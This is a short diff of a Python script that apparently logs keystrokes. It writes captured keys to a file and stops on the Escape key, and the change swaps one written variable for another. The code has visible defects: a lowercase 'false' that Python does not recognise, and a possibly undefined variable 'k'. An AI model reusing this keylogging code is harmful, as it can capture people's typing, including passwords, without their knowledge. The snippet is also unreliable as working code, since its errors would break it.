@@ -18,7 +18,7 @@ def write_file(key_arr):
             if ke.find(space)>0:
                 f.write('\n')
             if ke.find("key") == -1:
-                f.write(ke)
+                f.write(k)
 def on_release(key):
     if key == key.esc:
         return false
